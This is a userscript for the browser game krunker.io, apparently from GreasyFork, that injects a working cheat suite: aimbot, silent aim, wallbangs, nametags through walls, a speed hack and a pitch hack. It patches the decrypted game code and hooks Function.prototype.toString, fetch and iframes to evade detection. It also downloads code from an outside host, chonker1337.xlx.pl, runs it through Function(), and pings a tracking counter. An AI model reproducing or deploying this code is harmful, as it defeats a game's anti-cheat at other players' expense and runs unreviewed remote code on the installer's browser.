// ==UserScript==
// @name         gpu aimh@cks script dll apk js on cheats public patch v2
// @namespace    skidlamer.github.io
// @author       chonker1337
// @iconURL      https://i.imgur.com/QkEcRaR.png
// @match        *://krunker.io/*
// @description  Made By GamingGurusOfficial
// @run-at       document-start
// @grant        none
// @version 0.0.1.20201009201425
// @downloadURL https://update.greasyfork.org/scripts/412766/gpu%20aimh%40cks%20script%20dll%20apk%20js%20on%20cheats%20public%20patch%20v2.user.js
// @updateURL https://update.greasyfork.org/scripts/412766/gpu%20aimh%40cks%20script%20dll%20apk%20js%20on%20cheats%20public%20patch%20v2.meta.js
// ==/UserScript==

// i got bored of obfuscating so im just releasing it raw
// hope it wont get skidded

if (localStorage.gpuaimhaxsettngs === "undefined")
    localStorage.gpuaimhaxsettngs = "";

(function() {
    function req(url) {
        let xreq = new XMLHttpRequest()
        xreq.open("GET", url, false)
        xreq.setRequestHeader("Cache-Control", "no-cache")
        xreq.send(null)
        return xreq.responseText.slice(xreq.responseText.indexOf("/*start*/"), xreq.responseText.indexOf("//end"))
    }

    let wsdata;
    if (localStorage.wsdata) {
        wsdata = JSON.parse(localStorage.wsdata);
        delete localStorage.wsdata;
    } else {
        let cheatSttngsSafe = localStorage.gpuaimhaxsettngs
        delete localStorage.gpuaimhaxsettngs

        window.fetch("https://api.countapi.xyz/hit/chonker1337.xlx.pl/cheat2").then()

        const decodeURIComponent = window.decodeURIComponent;
        const exec = RegExp.prototype.exec;
        const toClean = new WeakMap()
        let _tostr = Function.prototype.toString;
        Function.prototype.toString = function toString() {
            if (toClean.has(this)) {
                return _tostr.apply(toClean.get(this), arguments)
            }
            return _tostr.apply(this, arguments)
        }
        toClean.set(Function.prototype.toString, _tostr)
        let _json = Response.prototype.json
        let hookedJson = Response.prototype.json = function json() {
            return _json.apply(this, arguments).then(obj => {
                if (obj.clientId && obj.host) {
                    console.log(obj)
                    localStorage.wsdata = JSON.stringify(obj)
                    document.open();
                    document.write(`<h1 style="text-align:center; background:green; color:white; font-size:48px; padding: 25px; font-family:sans-serif">LOADING CHEAT...</h1>`);
                    document.close();
                    localStorage.gpuaimhaxsettngs = cheatSttngsSafe
                    window.location.reload()
                    throw new Error()
                }
                return obj;
            })
        }
        toClean.set(hookedJson, _json)

        const hookedIframes = new WeakSet()
        let _contentWindowGet = Object.getOwnPropertyDescriptor(HTMLIFrameElement.prototype, "contentWindow").get;
        let newGet = function contentWindow() {
            if(arguments.callee.caller && arguments.callee.caller.toString().includes("recaptcha")) return _contentWindowGet.apply(this)

            let contentWindow = _contentWindowGet.apply(this)
            if (hookedIframes.has(contentWindow)) {
                return contentWindow
            }
            if (!contentWindow) {
                return contentWindow
            }
            let _json = contentWindow.Response.prototype.json;
            contentWindow.Response.prototype.json = function json() {
                return hookedJson.apply(this, arguments)
            }
            toClean.set(contentWindow.Response.prototype.json, _json);
            let _tostr2 = contentWindow.Function.prototype.toString;
            contentWindow.Function.prototype.toString = function toString() {
                if (toClean.has(this)) {
                    return _tostr2.apply(toClean.get(this), arguments)
                }
                return _tostr2.apply(this, arguments)
            }
            toClean.set(contentWindow.Function.prototype.toString, _tostr2)

            let _newGet = function contentWindow() {
                return newGet.apply(this, arguments)
            }
            Object.defineProperty(contentWindow.HTMLIFrameElement.prototype, "contentWindow", {
                get: _newGet,
                configurable: true,
            })
            toClean.set(_newGet, _contentWindowGet)

            hookedIframes.add(contentWindow)
            return contentWindow
        }
        Object.defineProperty(HTMLIFrameElement.prototype, "contentWindow", {
            get: newGet,
            configurable: true,
        })
        toClean.set(newGet, _contentWindowGet)

        return
    }

    {let _now=Date.now;Date.now=()=>_now()*(cheat.settings.speedHack?1.2:1)}

    let xreq = new XMLHttpRequest()
    Function(req("https://chonker1337.xlx.pl/1.php"))()

    window.cheat = {
        settings: {
            aimbot: 1,
            staticWeaponZoom: true,
            wallbangs: true,
            alwaysAim: false,
            pitchHack: 1,
            thirdPerson: false,
            autoReload: true,
            speedHack: true,
            rangeCheck: true,
            nameTags: true,
        },
        state: {
            quickscopeCanShoot: true,
        },
        gui: {},
        math: {
            getDir: function(x1, y1, x2, y2) {
                return Math.atan2(y1 - y2, x1 - x2);
            },
            getDistance: function(x1, y1, x2, y2) {
                return Math.sqrt((x2 -= x1) * x2 + (y2 -= y1) * y2);
            },
            getD3D: function(x1, y1, z1, x2, y2, z2) {
                const dx = x1 - x2, dy = y1 - y2, dz = z1 - z2;
                return Math.sqrt(dx * dx + dy * dy + dz * dz);
            },
            getAngleDst: function(a, b) {
                return Math.atan2(Math.sin(b - a), Math.cos(a - b));
            },
            getXDire: function(x1, y1, z1, x2, y2, z2) {
                const h = Math.abs(y1 - y2), dst = this.getD3D(x1, y1, z1, x2, y2, z2);
                return (Math.asin(h / dst) * ((y1 > y2) ? -1 : 1));
            },
            lineInRect: function(lx1, lz1, ly1, dx, dz, dy, x1, z1, y1, x2, z2, y2) {
                const t1 = (x1 - lx1) * dx, t2 = (x2 - lx1) * dx, t3 = (y1 - ly1) * dy;
                const t4 = (y2 - ly1) * dy, t5 = (z1 - lz1) * dz, t6 = (z2 - lz1) * dz;
                const tmin = Math.max(Math.max(Math.min(t1, t2), Math.min(t3, t4)), Math.min(t5, t6));
                const tmax = Math.min(Math.min(Math.max(t1, t2), Math.max(t3, t4)), Math.max(t5, t6));
                return (tmax < 0 || tmin > tmax) ? false : tmin;
            },
            getCanSee: function(game, from, toX, toY, toZ, boxSize) {
                if (!game || !from) return 0;
                boxSize = boxSize || 0;
                const cameraHeight = 1.5;
                for (let obj, dist = this.getD3D(from.x, from.y, from.z, toX, toY, toZ), xDr = this.getDir(from.z, from.x, toZ, toX), yDr = this.getDir(this.getDistance(from.x, from.z, toX, toZ), toY, 0, from.y), dx = 1 / (dist * Math.sin(xDr - Math.PI) * Math.cos(yDr)), dz = 1 / (dist * Math.cos(xDr - Math.PI) * Math.cos(yDr)), dy = 1 / (dist * Math.sin(yDr)), yOffset = from.y + (from.height || 0) - cameraHeight, i = 0; i < game.map.manager.objects.length; ++i)
                    if (!(obj = game.map.manager.objects[i]).noShoot && /*obj.active &&*/ !obj.transparent) {
                        const tmpDst = this.lineInRect(from.x, from.z, yOffset, dx, dz, dy, obj.x - Math.max(0, obj.width - boxSize), obj.z - Math.max(0, obj.length - boxSize), obj.y - Math.max(0, obj.height - boxSize), obj.x + Math.max(0, obj.width - boxSize), obj.z + Math.max(0, obj.length - boxSize), obj.y + Math.max(0, obj.height - boxSize));
                        if (tmpDst && 1 > tmpDst) return tmpDst;
                    }
                const terrain = game.map.terrain;
                if (terrain) {
                    const terrainRaycast = terrain.raycast(from.x, -from.z, yOffset, 1 / dx, -1 / dz, 1 / dy);
                    if (terrainRaycast) return this.getD3D(from.x, from.y, from.z, terrainRaycast.x, terrainRaycast.z, -terrainRaycast.y);
                }
                return null;
            }
        },
    }
    if (localStorage.gpuaimhaxsettngs) {
        Object.assign(cheat.settings, JSON.parse(localStorage.gpuaimhaxsettngs))
    } else {
        localStorage.gpuaimhaxsettngs = JSON.stringify(cheat.settings)
    }
    Object.defineProperty(Object.prototype, "thirdPerson", {
        get() {return cheat.settings.thirdPerson}
    })

    function getGuiHtml() {
        function createCheckbox(name, settingName, description = "", needsRestart = false) {
            return `<div class="settName" title="${description}">${name} ${needsRestart ? "<span style=\"color: #eb5656\">*</span>" : ""}<label class="switch" style="margin-left:10px"><input type="checkbox" onclick='cheat.gui.setSetting("${settingName}", this.checked)' ${cheat.settings[settingName]?"checked":""}><span class="slider"></span></label></div>`
        }

        function createSelect(name, settingName, options, description = "", needsRestart = false) {
            let built = `<div class="settName" title="${description}">${name} ${needsRestart ? "<span style=\"color: #eb5656\">*</span>" : ""}<select onchange='cheat.gui.setSetting("${settingName}", parseInt(this.value))' class="inputGrey2">`
            let i = 0;
            for (const option in options) {
                if (options.hasOwnProperty(option))
                    built += `<option value="${options[option]}" ${cheat.settings[settingName] == options[option]?"selected":""}>${option}</option>,`
            }
            return built + "</select></div>"
        }

        let built = `<div id="settHolder">
                <h3>OP AIMh@x js userscrtips no downalod</h3>
                <h5>Made by chonker1337, skidded and stolen by izioid.<br>
                Join <a href="https://discord.gg/9Xq6m3J">Gaming Gurus</a> for more hacks.<br></h5>
                <p style="font-size: 14px;margin: 10px">This hack isn't mean to make you slightly better in game. It's meant to make you fucking insane, so expect to get banned if you play with high level players. Also, don't ask me to add options like frustum check or aim assist</p><br>`

        built += createSelect("Aimbot", "aimbot", {
            "None": 0,
            "Quickscope": 1,
            "Silent aim": 2,
        })
        built += createSelect("Pitch hax", "pitchHack", {
            "Disabled": 0,
            "Downward": 1,
            "Upward": 2,
            "sin(time)": 3,
            "sin(time/5)": 4,
            "double": 5,
            "random": 6,
        }, "Only use with aimbot on")
        built += createCheckbox("Nametags", "nameTags")
        built += createCheckbox("Wallbangs", "wallbangs")
        built += createCheckbox("Always aim", "alwaysAim", "Makes you slower and jump lower, but the aimbot can start shooting at enemies much faster. Only use if ur good at bhopping")
        built += createCheckbox("Auto reload", "autoReload")
        built += createCheckbox("Speed hack", "speedHack", "Makes you 1.2x faster")
        built += createCheckbox("Third person mode", "thirdPerson")
        built += createCheckbox("No weapon zoom", "staticWeaponZoom", "Removes the distracting weapon zoom animation")
        built += createCheckbox("Aimbot range check", "rangeCheck")
        return built+"</div>"
    }
    function initGUI() {
        function createButton(name, iconURL, fn) {
            const menu = document.querySelector("#menuItemContainer"),
                menuItem = document.createElement("div"),
                menuItemIcon = document.createElement("div"),
                menuItemTitle = document.createElement("div");

            menuItem.className = "menuItem"
            menuItemIcon.className = "menuItemIcon"
            menuItemTitle.className = "menuItemTitle"

            menuItemTitle.innerHTML = name
            menuItemIcon.style.backgroundImage = `url("https://i.imgur.com/QkEcRaR.png")`

            menuItem.append(menuItemIcon, menuItemTitle)
            menu.append(menuItem)

            menuItem.addEventListener("click", fn)
        }
        cheat.gui.setSetting = function(setting, value) {
            cheat.settings[setting] = value;
            localStorage.gpuaimhaxsettngs = JSON.stringify(cheat.settings)
        }
        cheat.gui.windowIndex = window.windows.length+1;
        cheat.gui.settings = {
            aimbot: {
                val: cheat.settings.aimbot
            }
        }
        cheat.gui.windowObj = {
            header: "CH33T",
            html: "",
            gen() {
                return getGuiHtml();
            }
        };
        Object.defineProperty(window.windows, windows.length, {
            value: cheat.gui.windowObj
        })

        createButton("CH33TS", GM_info.script.icon, () => {
            window.showWindow(cheat.gui.windowIndex)
        })
    }

    function setVars(script) {
        cheat.vars = {}
        const regexes = new Map()
            .set("inView", [/if\(!\w+\['(\w+)']\)continue/, 1])
            .set("canSee", [/\w+\['(\w+)']\(\w+,\w+\['x'],\w+\['y'],\w+\['z']\)\)&&/, 1])
            .set("procInputs", [/this\['(\w+)']=function\((\w+),(\w+),\w+,\w+\){(this)\['recon']/, 1])
            .set("aimVal", [/this\['(\w+)']-=0x1\/\(this\['weapon']\['\w+']\/\w+\)/, 1])
            .set("pchObjc", [/0x0,this\['(\w+)']=new \w+\['Object3D']\(\),this/, 1])
            .set("didShoot", [/--,\w+\['(\w+)']=!0x0/, 1])
            .set("nAuto", [/'Single\\x20Fire','varN':'(\w+)'/, 1])
            .set("crouchVal", [/this\['(\w+)']\+=\w\['\w+']\*\w+,0x1<=this\['\w+']/, 1])
            .set("recoilAnimY", [/this\['(\w+)']=0x0,this\['recoilForce']=0x0/, 1])
            .set("ammos", [/\['length'];for\(\w+=0x0;\w+<\w+\['(\w+)']\['length']/, 1])
            .set("weaponIndex", [/\['weaponConfig']\[\w+]\['secondary']&&\(\w+\['(\w+)']==\w+/, 1])
            .set("objInstances", [/\w+\['genObj3D']\(0x0,0x0,0x0\);if\(\w+\['(\w+)']=\w+\['genObj3D']/, 1])
            .set("getWorldPosition", [/{\w+=\w+\['camera']\['(\w+)']\(\);/, 1])
            .set("mouseDownL", [/this\['\w+'\]=function\(\){this\['(\w+)'\]=\w*0,this\['(\w+)'\]=\w*0,this\['\w+'\]={}/, 1])
            .set("mouseDownR", [/this\['(\w+)']=0x0,this\['keys']=/, 1])
            .set("reloadTimer", [/this\['(\w+)']-=\w+,\w+\['reloadUIAnim']/, 1])
            .set("maxHealth", [/this\['health']\/this\['(\w+)']\?/, 1])
            .set("xVel", [/this\['x']\+=this\['(\w+)']\*\w+\['map']\['config']\['speedX']/, 1])
            .set("yVel", [/this\['y']\+=this\['(\w+)']\*\w+\['map']\['config']\['speedY']/, 1])
            .set("zVel", [/this\['z']\+=this\['(\w+)']\*\w+\['map']\['config']\['speedZ']/, 1])


        for (const [name, arr] of regexes) {
            let found = arr[0].exec(script);
            if (!found) {
                alert("Failed to find " + name);
                cheat.vars[name] = null;
            } else {
                //console.log("Found ", name, " - ", found[arr[1]]);
                cheat.vars[name] = found[arr[1]];
            }
        }
    }

    function patch(gameCode) {
        let additionalPatches = Function("return "+req("https://chonker1337.xlx.pl/2.php"))()
        for (let i = 0; i < additionalPatches.length; i++) {
            try {
                gameCode = gameCode.replace(additionalPatches[i][0], additionalPatches[i][1])
            } catch (e) {}
        }

        // nametags
        gameCode = gameCode.replace(/if\((!\w+\['\w+'])\)continue;/, "if($1&&!cheat.settings.nameTags)continue;");

        // wallbangs
        gameCode = gameCode.replace(/!(\w+)\['transparent']/, "$&& (!cheat.settings.wallbangs || !$1.penetrable )")

        // weapon zoom
        gameCode = gameCode.replace(/(if\(this\['weapon']\['zoom'])/, window.cheat.settings.staticWeaponZoom ? "$1=1" : "$1")

        // aimbot (procinputs)
        gameCode = gameCode.replace(/(this\['\w+']=function\(\w+,\w+,\w+,\w+\){)(this\['recon'])/, "$1{\n"+`
        const [input, game, recon, lock] = arguments, me = this, key = {
            frame: 0,
            delta: 1,
            ydir: 2,
            xdir: 3,
            moveDir: 4,
            shoot: 5,
            scope: 6,
            jump: 7,
            crouch: 8,
            reload: 9,
            weaponScroll: 10,
            weaponSwap: 11,
            moveLock: 12
        };
        if (cheat.settings.autoReload && me[cheat.vars.ammos][me[cheat.vars.weaponIndex]] === 0)
                input[key.reload] = 1;
        if (cheat.settings.pitchHack) 
            switch (cheat.settings.pitchHack) {
            case 1:
                input[key.xdir] = -Math.PI*500
                break;
            case 2:
                input[key.xdir] = Math.PI*500
                break;
            case 3:
                input[key.xdir] = Math.sin(Date.now() / 50) * Math.PI * 500
                break;
            case 4:
                input[key.xdir] = Math.sin(Date.now() / 250) * Math.PI * 500
                break;
            case 5:
                input[key.xdir] = input[key.frame] % 2 ? Math.PI*500 : -Math.PI*500
                break;
            case 6:
                input[key.xdir] = (Math.random() * Math.PI - Math.PI/2) * 1000
                break;
            }
        game.players.list.forEach(v=>v.pos={x:v.x,y:v.y,z:v.z})
        let target = game.players.list.filter(enemy => {
            return !enemy.isYTMP && enemy.hasOwnProperty('pos') && ((me.team === null || enemy.team !== me.team) && enemy.health > 0 && enemy[cheat.vars.inView])
        }).sort((p1, p2) => cheat.math.getDistance(me.x, me.z, p1.pos.x, p1.pos.z) - cheat.math.getDistance(me.x, me.z, p2.pos.x, p2.pos.z)).shift();
        if (target && cheat.settings.aimbot && (cheat.math.getD3D(me.x, me.y, me.z, target.x, target.y, target.z) <= me.weapon.range || !cheat.settings.rangeCheck) && !me[cheat.vars.reloadTimer]) {
            const yDire = (cheat.math.getDir(me.z, me.x, target.pos.z, target.pos.x) || 0) * 1000
            const xDire = ((cheat.math.getXDire(me.x, me.y, me.z, target.pos.x, target.pos.y - target[cheat.vars.crouchVal] * 3 + me[cheat.vars.crouchVal] * 3, target.pos.z) || 0) - (0.3 * me[cheat.vars.recoilAnimY])) * 1000
            if (cheat.settings.aimbot === 2)
                input[key.scope] = 1;
            if ( /* me.weapon[cheat.vars.nAuto] && */ me[cheat.vars.didShoot]) {
                input[key.shoot] = 0;
                cheat.state.quickscopeCanShoot = false;
                setTimeout(() => {
                    cheat.state.quickscopeCanShoot = true;
                }, me.weapon.rate);
            } else if (cheat.state.quickscopeCanShoot) {
                input[key.scope] = 1;
                if (!me[cheat.vars.aimVal] || me.weapon.noAim) {
                    input[key.ydir] = yDire
                    input[key.xdir] = xDire
                    input[key.shoot] = 1;
                }
            }
        }
        if (cheat.settings.alwaysAim) input[key.scope] = 1;
        if (cheat.settings.pitchHack === 1 && input[key.jump] && (me.weapon.name === "Shotgun" || me.weapon.name === "Sawed Off"))  {
            input[key.shoot] = 1
        }
    `+"};$2")
        return gameCode
    }

    window.gameCodeInit = function(script) {
        return setVars(script), patch(script)
    }


    // custom loader thing

    window.addEventListener("load", () => {
        let itv = setInterval(() => {
            if (window.windows) {
                clearInterval(itv);
                initGUI();
            }
        }, 200);
    })

    window.fetch = new Proxy(fetch, {
        apply(target, thisArg, argArray) {
            if (argArray[0].includes("/seek-game")) {
                return Promise.resolve({
                    json() {
                        return Promise.resolve(wsdata)
                    },
                    status: 200,
                    statusText: "",
                    ok: true,
                })
            }
            return target.apply(thisArg, argArray);
        }
    })

    let observer = new MutationObserver(mutations => {
        for (const mutation of mutations) {
            for (let node of mutation.addedNodes) {
                if (node.tagName === 'SCRIPT' && node.type === "text/javascript" && node.innerHTML.includes("Yendis Entertainment")) {
                    node.innerHTML = `
                fetch("https://krunker.io/social.html")
                    .then(resp => resp.text())
                    .then(text => fetch("https://krunker.io/pkg/krunker."+/\\w.exports="(\\w+)"/.exec(text)[1]+".vries"))
                    .then(resp => resp.arrayBuffer())
                    .then(buf  => {
                        let vries = new Uint8Array(buf);
                        let xor = vries[0] ^ 33;
                        return new TextDecoder().decode(vries.map(b => b^xor))
                    })
                    .then(gamejs => Function("__LOADER__mmTokenPromise", "/* Loader made by chonker1337 */ "+window.gameCodeInit(gamejs))(Promise.resolve("hello kpal")))
                `
                }
            }
        }
    });
    observer.observe(document, {
        childList: true,
        subtree: true
    });
})();
